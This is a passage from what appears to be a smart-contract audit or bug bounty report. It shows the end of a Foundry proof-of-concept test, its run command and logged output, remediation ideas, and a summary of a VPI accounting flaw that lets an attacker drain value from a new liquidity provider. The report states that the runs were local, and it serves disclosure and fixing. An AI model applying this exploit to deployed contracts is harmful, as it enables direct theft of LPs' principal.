        assertEq(claimableShares, attackerShares, "redemption must be fully funded");
        vm.prank(ATTACKER_LP);
        uint256 redeemedAssets = juniorVault.claimRedeem(
            redeemId, claimableShares, ATTACKER_LP, ATTACKER_LP
        );
        assertGt(redeemedAssets, attackerDeposit, "LP must realize open VPI in share price");
        settlementToken.mint(RESTORER_LP, redeemedAssets);
        vm.startPrank(RESTORER_LP);
        settlementToken.approve(address(juniorVault), redeemedAssets);
        uint256 restorerRequest = juniorVault.requestDeposit(redeemedAssets, RESTORER_LP, RESTORER_LP);
        vm.stopPrank();
        vm.warp(juniorVault.depositEpochStart(restorerRequest));
        router.settleLpEpoch(_oneBpPriceUpdate());
        uint256 restorerClaimable = juniorVault.claimableDepositRequest(restorerRequest, RESTORER_LP);
        assertEq(restorerClaimable, redeemedAssets, "restoration deposit must fully settle");
        vm.prank(RESTORER_LP);
        juniorVault.claimDeposit(restorerRequest, restorerClaimable, RESTORER_LP, RESTORER_LP);
        uint256 restorerShares = juniorVault.balanceOf(RESTORER_LP);
        assertGt(restorerShares, 0);
        console2.log("depth before withdrawal atoms", depthWithoutRedemption);
        console2.log("depth after restoration atoms", pool.totalAssets());
        assertEq(pool.totalAssets(), depthWithoutRedemption, "restore exact original depth");

        (, uint256 confidence) = pletherOracle.getLatestPoolReconcilePrice();
        uint256 closePrice = pletherOracle.getLatestPrice()
            + confidence * pletherOracle.adverseConfidenceMultiplierBps() / 10_000;
        ICfdEngineTypes.ClosePreview memory actualDepthClose =
            engineLens.previewClose(ATTACKER_TRADER, tradeSize, closePrice);
        ICfdEngineTypes.ClosePreview memory fullDepthClose =
            engineLens.simulateClose(ATTACKER_TRADER, tradeSize, closePrice, depthWithoutRedemption);
        console2.log("neutral mark price", pletherOracle.getLatestPrice());
        console2.log("aggregate confidence", confidence);
        assertLt(actualDepthClose.vpiDeltaAssets, 0, "close must rebate VPI");
        assertLt(fullDepthClose.vpiDeltaAssets, 0, "full-depth close still rebates VPI");
        console2.log("restored-depth close VPI rebate atoms", uint256(-actualDepthClose.vpiDeltaAssets));
        console2.log("reference-depth close VPI rebate atoms", uint256(-fullDepthClose.vpiDeltaAssets));

        OrderV3Types.OrderRequest memory closeRequest =
            _v3Request(CfdTypes.Side.LONG, tradeSize, 0, 200_000_000, true);
        vm.prank(ATTACKER_TRADER);
        router.commitOrder(closeRequest);
        router.executeOrder(2, _oneBpPriceUpdate());

        (uint256 remainingSize,,,,,,) = engine.positions(ATTACKER_TRADER);
        assertEq(remainingSize, 0, "closing order must execute fully");

        uint256 traderBalanceAfter = clearinghouse.balanceAssets(ATTACKER_TRADER);
        uint256 victimPrincipalAfter = juniorVault.estimateRedeemAssets(victimShares);
        uint256 restorerPrincipalAfter = juniorVault.estimateRedeemAssets(restorerShares);
        uint256 combinedAfter = redeemedAssets + traderBalanceAfter;
        uint256 combinedBefore = attackerDeposit + traderFunding;

        console2.log("open positive VPI atoms", uint256(paidVpi));
        console2.log("redeemed assets atoms", redeemedAssets);
        console2.log("trader balance after atoms", traderBalanceAfter);
        console2.log("attacker combined after atoms", combinedAfter);
        console2.log("attacker combined before atoms", combinedBefore);
        console2.log("victim principal before atoms", victimPrincipalBefore);
        console2.log("victim principal after atoms", victimPrincipalAfter);
        console2.log("attacker net gain atoms", combinedAfter - combinedBefore);
        console2.log("victim principal gain atoms", victimPrincipalAfter - victimPrincipalBefore);
        console2.log("restorer principal after atoms", restorerPrincipalAfter);
        console2.log("restorer deposit atoms", redeemedAssets);

        assertGt(combinedAfter, combinedBefore, "attacker LP + trader should profit");
        assertLt(restorerPrincipalAfter, redeemedAssets, "new LP principal should fall");

        uint256 restorerReady = juniorVault.lastDepositTime(RESTORER_LP) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < restorerReady) vm.warp(restorerReady);
        vm.prank(RESTORER_LP);
        uint256 restorerRedeemId = juniorVault.requestRedeem(restorerShares, RESTORER_LP, RESTORER_LP);
        vm.warp(pool.lpEpochStart(restorerRedeemId));
        router.settleLpEpoch(_oneBpPriceUpdate());
        uint256 restorerClaimableShares = juniorVault.claimableRedeemRequest(restorerRedeemId, RESTORER_LP);
        assertEq(restorerClaimableShares, restorerShares, "new LP redemption must fully settle");
        vm.prank(RESTORER_LP);
        uint256 restorerPaid = juniorVault.claimRedeem(
            restorerRedeemId, restorerShares, RESTORER_LP, RESTORER_LP
        );
        console2.log("restorer actually paid atoms", restorerPaid);
        assertLt(restorerPaid, redeemedAssets, "new LP must actually receive less than principal");
    }
}
```

From the checkout root, run:

```sh
forge test --root packages/perps --skip test/perps --match-path test/validation/VpiRestoredDepthSingleAddressV3.t.sol --offline --use 0.8.35 -vv
```

Full observed output (USDG amounts are six-decimal atoms):

```text
No files changed, compilation skipped

Ran 1 test for test/validation/VpiRestoredDepthSingleAddressV3.t.sol:VpiRestoredDepthSingleAddressV3ValidationTest
[PASS] test_RestoredDepthSingleAddressV3StillTransfersNewLpPrincipal() (gas: 15864150)
Logs:
  depth before withdrawal atoms 10008001599205
  depth after restoration atoms 10008001599205
  neutral mark price 100000000
  aggregate confidence 9982
  restored-depth close VPI rebate atoms 7993985096
  reference-depth close VPI rebate atoms 7993985096
  open positive VPI atoms 7999599205
  redeemed assets atoms 5904778645039
  trader balance after atoms 96572514041
  attacker combined after atoms 6001351159080
  attacker combined before atoms 6000000000000
  victim principal before atoms 4099999999996
  victim principal after atoms 4100749203522
  attacker net gain atoms 1351159080
  victim principal gain atoms 749203526
  restorer principal after atoms 5901078122146
  restorer deposit atoms 5904778645039
  restorer actually paid atoms 5901078122135

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 20.99ms (12.75ms CPU time)

Ran 1 test suite in 36.11ms (20.99ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

Here `RESTORER_LP` deposits exactly the amount withdrawn by the attacker LP, waits for its deposit epoch, and receives Junior shares. The test asserts the original HousePool depth is restored before close, then executes the full close. The replenishing LP later claims its entire redemption at a loss. The original victim LP is not the harmed LP in this variant: its estimated NAV rises, and the test does not execute its redemption. The equal close VPI figures are previews at equal depths. Both outputs are local Foundry runs. No production or public testnet contract was touched.


## Remediation

The accounting rule should prevent a still-refundable opening VPI charge from becoming irreversibly withdrawable Junior value. One approach is to recognize the recoverable positive VPI as a position-linked contingent obligation in the same terminal NAV calculation used for LP entry and redemption, releasing it as revenue only when the position's ability to reclaim it ends. An alternative deferral or reserve design could achieve the same property, but it must preserve existing trader-claim priority, cash solvency checks, partial closes, and the Senior/Junior revenue waterfall. These are **proposed designs**, not verified patches.

A regression test should open with positive VPI, settle an already-mature Junior redemption while the position is open, close at an unchanged neutral mark, and verify both the attacker's combined balance and another LP's actual redemption payout. It should also test a close priced at the original depth, an LP redemption without a refundable VPI position, partial closes, and the case where Senior has an impairment requiring revenue restoration. No fixed release or passing remediation test has been verified.


## Summary

The v2.0.0 production source in the frozen competition snapshot books refundable opening VPI into withdrawable Junior NAV. An attacker using one ordinary address with Junior shares and a funded trader balance can redeem that value and later close for a VPI rebate, imposing a direct principal loss on another LP. The primary executed test leaves the attacker **1,378.836395 USDG ahead** and the victim LP's actual payout **2,978.995776 USDG below deposit**. A second test restores pool depth before close and still leaves the attacker **1,351.159080 USDG ahead** and the replenishing LP's actual payout **3,700.522904 USDG below deposit**. The demonstrated impact fits the scope's Critical direct-theft category. The first affected and fixed releases remain unverified.
